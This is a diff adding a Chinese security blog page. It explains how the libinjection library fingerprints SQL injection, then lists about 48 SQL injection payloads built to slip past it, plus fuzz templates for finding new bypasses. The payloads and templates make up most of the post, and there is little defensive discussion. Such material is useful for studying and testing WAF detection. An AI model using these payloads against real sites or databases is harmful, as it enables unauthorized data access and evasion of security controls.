@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html  lang="en" >
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, maximum-scale=5, viewport-fit=cover">
+    <title>内网渗透总结 | h00ls</title>
+    <meta name="description" content="Bypass 语义检测的Sql注入面试总能让人成长。 libinjectionlibinjection是一个开源的SQL注入语义分析库，它通过将sql注入语句分解，然后将分解的字符串进行转化，构造成另一种表达形式。然后他还有单独的一个库，里面存放着很多Sql注入的语句表达形式。  举个例子，如上图，他将union select 1,2 编码成 UE1。  看不太懂C语言版本，那就看看python的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透总结">
+<meta property="og:url" content="http://example.com/2021/04/09/Bypass%20%E8%AF%AD%E4%B9%89%E6%A3%80%E6%B5%8B%E7%9A%84Sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="h00ls">
+<meta property="og:description" content="Bypass 语义检测的Sql注入面试总能让人成长。 libinjectionlibinjection是一个开源的SQL注入语义分析库，它通过将sql注入语句分解，然后将分解的字符串进行转化，构造成另一种表达形式。然后他还有单独的一个库，里面存放着很多Sql注入的语句表达形式。  举个例子，如上图，他将union select 1,2 编码成 UE1。  看不太懂C语言版本，那就看看python的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/04/09/images/image-20210409184919201.png">
+<meta property="og:image" content="http://example.com/2021/04/09/images/image-20210409185417164.png">
+<meta property="og:image" content="http://example.com/2021/04/09/images/image-20210409203203686.png">
+<meta property="article:published_time" content="2021-04-09T08:18:03.000Z">
+<meta property="article:modified_time" content="2021-04-09T12:38:06.273Z">
+<meta property="article:author" content="h00ls">
+<meta property="article:tag" content="内网渗透专栏">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/04/09/images/image-20210409184919201.png">
+
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml">
+    <link rel="icon" href="/images/favicon.png" type="image/x-icon">
+
+    
+<link rel="stylesheet" href="/css/common.min.css">
+
+
+
+    
+    
+    
+    
+        <link href="//cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/css/lightgallery.min.css" rel="stylesheet">
+    
+    
+    
+<link rel="stylesheet" href="/css/iconfont.min.css">
+
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+    <body>
+        <header class="header header-fixture">
+    <div class="profile-search-wrap flex sm:block">
+        
+        
+        <div class="profile sm:text-center md:px-1 lg:px-3 sm:pb-4 sm:pt-6">
+            <a id="avatar" role="link" href="https://github.com/h00ls" class="inline-block lg:w-16 lg:h-16 w-8 h-8 m-2" target="_blank" rel="noopener" rel="noreferrer" >
+                <img src="https://www.gravatar.com/avatar/0bc83cb571cd1c50ba6f3e8a78ef1346?s=128" class="rounded-full" alt="avatar">
+            </a>
+            <h2 id="name" class="hidden lg:block">h00ls</h2>
+            <h3 id="title" class="hidden xl:block">安全那些事</h3>
+            
+            <small id="location" class="hidden lg:block">
+                <i class="iconfont icon-map-icon"></i>
+                Sichuan, China
+            </small>
+            
+        </div>
+        
+        
+<div class="search flex-1 flex lg:inline-block sm:hidden lg:px-4 lg:mt-2 lg:mb-4 lg:w-full">
+    <form id="search-form" class="my-auto flex-1 lg:border lg:border-solid lg:border-gray-200">
+        <div class="input-group table bg-gray-100 lg:bg-white w-full">
+            <input id="search-input" type="text" placeholder="Search" class="inline-block w-full bg-gray-100 lg:bg-white">
+            <span class="table-cell">
+                <button name="search tigger button" disabled>
+                    <i class="iconfont icon-search m-2"></i>
+                </button>
+            </span>
+        </div>
+    </form>
+        
+<script id="search-teamplate" type="text/html" data-path="/content.json">
+    <div>
+        <div class="search-header bg-gray-400">
+            <input id="actual-search-input" model="keyword" ref="input" class="inline-block w-full h-10 px-2 py-1" placeholder="Search" type="text">
+        </div>
+        <div class="search-result bg-gray-200">
+            {{#each searchPosts}}
+            <a href="/{{ path }}" class="result-item block px-2 pb-3 mb-1 pt-1 hover:bg-indigo-100">
+                <i class="iconfont icon-file"></i>
+                <h1 class="result-title inline font-medium text-lg">{{ title }}</h1>
+                <p class="result-content text-gray-600 text-sm">{{{ text }}}</p>
+            </a>
+            {{/each}}
+        </div>
+    </div>
+</script>
+
+</div>
+
+
+        <button name="menu toogle button" id="menu-toggle-btn" class="block sm:hidden p-3" role="button" aria-expanded="false">
+            <i class="iconfont icon-hamburger"></i>
+        </button>
+    </div>
+    <nav id="menu-nav" class="hidden sm:flex flex-col">
+        
+        
+            <div class="menu-item menu-home" role="menuitem">
+                <a href="/.">
+                    <i class="iconfont icon-home" aria-hidden="true"></i>
+                    <span class="menu-title">Home</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-archives" role="menuitem">
+                <a href="/archives">
+                    <i class="iconfont icon-archive" aria-hidden="true"></i>
+                    <span class="menu-title">Archives</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-categories" role="menuitem">
+                <a href="/categories">
+                    <i class="iconfont icon-folder" aria-hidden="true"></i>
+                    <span class="menu-title">Categories</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-tags" role="menuitem">
+                <a href="/tags">
+                    <i class="iconfont icon-tag" aria-hidden="true"></i>
+                    <span class="menu-title">Tags</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-repository" role="menuitem">
+                <a href="/repository">
+                    <i class="iconfont icon-project" aria-hidden="true"></i>
+                    <span class="menu-title">Repository</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-links" role="menuitem">
+                <a href="/links">
+                    <i class="iconfont icon-friend" aria-hidden="true"></i>
+                    <span class="menu-title">Links</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-about" role="menuitem">
+                <a href="/about">
+                    <i class="iconfont icon-cup" aria-hidden="true"></i>
+                    <span class="menu-title">About</span>
+                </a>
+            </div>
+        
+        
+<div class="social-links flex sm:flex-col lg:hidden mt-5">
+    
+        <span class="social-item text-center">
+            <a target="_blank" rel="noopener" href="https://github.com/h00ls">
+                <i class="iconfont social-icon icon-github"></i>
+                <span class="menu-title hidden lg:inline">menu.github</span>
+            </a>
+        </span>
+    
+        <span class="social-item text-center">
+            <a href="/atom.xml">
+                <i class="iconfont social-icon icon-rss"></i>
+                <span class="menu-title hidden lg:inline">menu.rss</span>
+            </a>
+        </span>
+    
+</div>
+
+
+    </nav>
+</header>
+
+        <section class="main-section">
+            
+    <main class="flex-1 px-4 py-12 md:px-5 lg:px-8 lg:py-4 relative min-h-screen">
+    
+
+    <article class="content article article-archives article-type-list" itemscope="">
+        <header class="article-header">
+            
+    
+        <h1 class="article-title text-lg" itemprop="name">
+            内网渗透总结
+        </h1>
+    
+
+
+
+            <p class="article-meta mb-3 text-xs">
+                <span class="article-date">
+    <i class="iconfont icon-calendar-check"></i>
+	<a href="/2021/04/09/Bypass%20%E8%AF%AD%E4%B9%89%E6%A3%80%E6%B5%8B%E7%9A%84Sql%E6%B3%A8%E5%85%A5/" class="article-date">
+	  <time datetime="2021-04-09T08:18:03.000Z" itemprop="datePublished">Apr 9</time>
+	</a>
+</span>
+                
+
+                
+    <span class="article-tags">
+    <i class="iconfont icon-tag"></i>
+    <a class="article-tag-none-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%93%E6%A0%8F/" rel="tag">内网渗透专栏</a>
+  </span>
+
+
+                <span class="_partial/post-comment"><i class="icon icon-comment"></i>
+                    <a href="/2021/04/09/Bypass%20%E8%AF%AD%E4%B9%89%E6%A3%80%E6%B5%8B%E7%9A%84Sql%E6%B3%A8%E5%85%A5/#comments" class="article-comment-link">
+                        Comments
+                    </a>
+                </span>
+                
+
+
+    
+        <span class="post-wordcount" itemprop="wordCount">Word Count: 828(words)</span>
+    
+	
+	
+    
+        <span class="post-readcount" itemprop="timeRequired">Read Count: 4(minutes)</span>
+    
+	
+	
+    
+		<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+		<span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span></span>
+		<span class="post-meta-divider"> | </span>
+		<span id="busuanzi_container_site_uv">UV: <span id="busuanzi_value_site_uv"></span></span>
+
+    
+	
+	
+
+
+            </p>
+        </header>
+        <div class="marked-body article-body">
+            <h2 id="Bypass-语义检测的Sql注入"><a href="#Bypass-语义检测的Sql注入" class="headerlink" title="Bypass 语义检测的Sql注入"></a>Bypass 语义检测的Sql注入</h2><p>面试总能让人成长。</p>
+<h3 id="libinjection"><a href="#libinjection" class="headerlink" title="libinjection"></a>libinjection</h3><p>libinjection是一个开源的SQL注入语义分析库，它通过将sql注入语句分解，然后将分解的字符串进行转化，构造成另一种表达形式。然后他还有单独的一个库，里面存放着很多Sql注入的语句表达形式。</p>
+<p><img src="../images/image-20210409184919201.png" alt="image-20210409184919201"></p>
+<p>举个例子，如上图，他将<code>union select 1,2</code> 编码成 <code>UE1</code>。</p>
+<p><img src="../images/image-20210409185417164.png" alt="image-20210409185417164"></p>
+<p>看不太懂C语言版本，那就看看python的。如上，就是该程序的映射规则。</p>
+<p>下面是生成的一些数据库，通过与他匹配从而实现sql注入的检测。</p>
+<p><img src="../images/image-20210409203203686.png" alt="image-20210409203203686"></p>
+<p>关于绕过，其实就是破坏这种结构，网上的payload很多。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Fingerprint: &amp;1o.U Payload: or 1&lt;@. union select 1,version()#</span><br><span class="line">Fingerprint: &amp;1oUE Payload: or 1.&lt;@ union select 1,version()#</span><br><span class="line">Fingerprint: &amp;vo.U Payload: or @&lt;@. union select 1,version()#</span><br><span class="line">Fingerprint: &amp;voUE Payload: or !@&lt;@ union select 1,version()#</span><br><span class="line">Fingerprint: sns   Payload: or 1&lt;@ union select &#39;a&#39;,version()#</span><br><span class="line">Fingerprint: &amp;(1)&amp; Payload: or (1) or 1&#x3D;1#</span><br><span class="line">Fingerprint: &amp;(v)&amp; Payload: or (@) or 1&#x3D;1#</span><br><span class="line">Fingerprint: &amp;1o&amp;1 Payload: or 1&lt;@ or 1&#x3D;1#</span><br><span class="line">Fingerprint: &amp;1o.&amp; Payload: or 1&lt;@. or 1&#x3D;1#</span><br><span class="line">Fingerprint: &amp;1ov&amp; Payload: or 1%@ or 1&#x3D;1#</span><br><span class="line">Fingerprint: &amp;vo&amp;1 Payload: or @&lt;@ or 1&#x3D;1#</span><br><span class="line">Fingerprint: &amp;vo.&amp; Payload: or @&lt;@. or 1&#x3D;1#</span><br><span class="line">Fingerprint: 1o&amp;1c Payload: + 1&lt;@ or 1&#x3D;1#</span><br><span class="line">Fingerprint: 1o.&amp;1 Payload: + 1&lt;@. or 1&#x3D;1#</span><br><span class="line">Fingerprint: s(&amp;1c Payload: or 1#&#39;( or 1&#x3D;1#</span><br><span class="line">Fingerprint: s(s   Payload: or &#39;(&#39; or 1&#x3D;1#</span><br><span class="line">Fingerprint: s)s   Payload: or &#39;)&#39; or 1&#x3D;1#</span><br><span class="line">Fingerprint: s,&amp;1c Payload: or 1#&#39;, or 1&#x3D;1#</span><br><span class="line">Fingerprint: s.&amp;1c Payload: or 1#&#39;. or 1&#x3D;1#</span><br><span class="line">Fingerprint: s.s   Payload: or &#39;.&#39; or 1&#x3D;1#</span><br><span class="line">Fingerprint: s1&amp;1c Payload: or 1#&#39;1 or 1&#x3D;1#</span><br><span class="line">Fingerprint: s1s   Payload: or &#39;1&#39; or 1&#x3D;1#</span><br><span class="line">Fingerprint: sc    Payload: or &quot;#&quot; or 1&#x3D;1#</span><br><span class="line">Fingerprint: sn&amp;1c Payload: or 1#&#39;a or 1&#x3D;1#</span><br><span class="line">Fingerprint: sns   Payload: or &#39;a&#39; or 1&#x3D;1#</span><br><span class="line">Fingerprint: sv    Payload: or &#39;@&#39; or 1&#x3D;1#</span><br><span class="line">Fingerprint: sv&amp;1c Payload: or 1#&#39;@ or 1&#x3D;1#</span><br><span class="line">Fingerprint: s&#123;&amp;1c Payload: or 1#&#39;&#123; or 1&#x3D;1#</span><br><span class="line">Fingerprint: s&#123;s   Payload: or &#39;&#123;&#39; or 1&#x3D;1#</span><br><span class="line">Fingerprint: vo&amp;1c Payload: + @&lt;@ or 1&#x3D;1#</span><br><span class="line">Fingerprint: vo.&amp;1 Payload: + @&lt;@. or 1&#x3D;1#</span><br><span class="line">Fingerprint: s&amp;1o. Payload: &#39; or 1&lt;@. union select @@version,version()#</span><br><span class="line">Fingerprint: s&amp;1oU Payload: &#39; or 1&lt;@ union select @@version,version()#</span><br><span class="line">Fingerprint: s&amp;vo. Payload: &#39; or @&lt;@. union select @@version,version()#</span><br><span class="line">Fingerprint: s&amp;voU Payload: &#39; or @&lt;@ union select @@version,version()#</span><br><span class="line">Fingerprint: so.UE Payload: &#39; + 1&lt;@. union select @@version,version()#</span><br><span class="line">Fingerprint: soUE1 Payload: &#39; + 1&lt;@ union select 1,version()#</span><br><span class="line">Fingerprint: soUEf Payload: &#39; + 1&lt;@ union select version(),version()#</span><br><span class="line">Fingerprint: soUEs Payload: &#39; + 1&lt;@ union select &#39;a&#39;,version()#</span><br><span class="line">Fingerprint: soUEv Payload: &#39; + 1&lt;@ union select @@version,version()#</span><br><span class="line">Fingerprint: so&amp;1c Payload: &#39; + 1&lt;@ or 1&#x3D;1#</span><br><span class="line">Fingerprint: s&amp;1o&amp; Payload: &#39; or 1&lt;@ or 1&#x3D;1#</span><br><span class="line">Fingerprint: s&amp;vo&amp; Payload: &#39; or @&lt;@ or 1&#x3D;1#</span><br><span class="line">Fingerprint: so&amp;1c Payload: &#39; + 1&lt;@ or 1&#x3D;1#</span><br><span class="line">Fingerprint: so.&amp;1 Payload: &#39; + 1&lt;@. or 1&#x3D;1#</span><br><span class="line">Fingerprint: sUE11 Payload: &#39; union select 1.$,version()#</span><br><span class="line">Fingerprint: sUEsn Payload: &#39; union select &#39;&#39;a,version()#</span><br><span class="line">Fingerprint: s     Payload: &#39; union select &quot;&quot;a,version()#</span><br></pre></td></tr></table></figure>
+<p>通过FUZZ一些特殊的字符，然后绕过上面的规则，从而实现Bypass</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> or &#123;fuzz&#125; or 1&#x3D;1#</span><br><span class="line"> + &#123;fuzz&#125; or 1&#x3D;1#</span><br><span class="line"> or &#123;fuzz&#125; union select 1,version()#</span><br><span class="line"> + &#123;fuzz&#125; union select 1,version()#</span><br><span class="line">&#39; or &#123;fuzz&#125; or 1&#x3D;1#</span><br><span class="line">&#39; + &#123;fuzz&#125; or 1&#x3D;1#</span><br><span class="line">&#39; or &#123;fuzz&#125; union select 1,version()#</span><br><span class="line">&#39; + &#123;fuzz&#125; union select 1,version()#</span><br><span class="line">&#39; union select &#123;fuzz&#125;,version()#</span><br></pre></td></tr></table></figure>
+
+        </div>
+        
+<blockquote class="copyright">
+    <p><strong>Link to this article : </strong><a class="permalink" href="http://example.com/2021/04/09/Bypass%20%E8%AF%AD%E4%B9%89%E6%A3%80%E6%B5%8B%E7%9A%84Sql%E6%B3%A8%E5%85%A5/">http://example.com/2021/04/09/Bypass 语义检测的Sql注入/</a></p>
+    <p><strong>This article is available under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a> License</strong></p>
+</blockquote>
+
+
+    </article>
+    
+    <section id="comments">
+        
+    </section>
+
+
+    
+
+</main>
+
+
+<aside style="" id="sidebar" class="aside aside-fixture">
+    <div class="toc-sidebar">
+        <nav id="toc" class="article-toc">
+            <h3 class="toc-title">Catalogue</h3>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-%E8%AF%AD%E4%B9%89%E6%A3%80%E6%B5%8B%E7%9A%84Sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">Bypass 语义检测的Sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#libinjection"><span class="toc-number">1.1.</span> <span class="toc-text">libinjection</span></a></li></ol></li></ol>
+        </nav>
+    </div>
+</aside>
+
+
+
+
+
+        </section>
+        <footer class="hidden lg:block fixed bottom-0 left-0 sm:w-1/12 lg:w-1/6 bg-gray-100 z-40">
+    
+    <div class="footer-social-links">
+        
+            <a target="_blank" rel="noopener" href="https://github.com/h00ls">
+                <i class="iconfont icon-github"></i>
+            </a>
+        
+            <a href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+            </a>
+        
+    </div>
+    
+    
+</footer>
+
+        <div id="mask" class="hidden mask fixed inset-0 bg-gray-900 opacity-75 z-40"></div>
+        <div id="search-view-container" class="hidden shadow-xl"></div>
+        
+<script src="/js/dom-event.min.js"></script>
+
+<script src="//cdn.jsdelivr.net/npm/yox@1.0.0-alpha.121/dist/standard/prod/yox.min.js"></script>
+
+
+<script src="/js/search.min.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/js/lightgallery.min.js"></script>
+    
+<script src="/js/light-gallery.min.js"></script>
+
+
+
+
+
+    </body>
+</html>
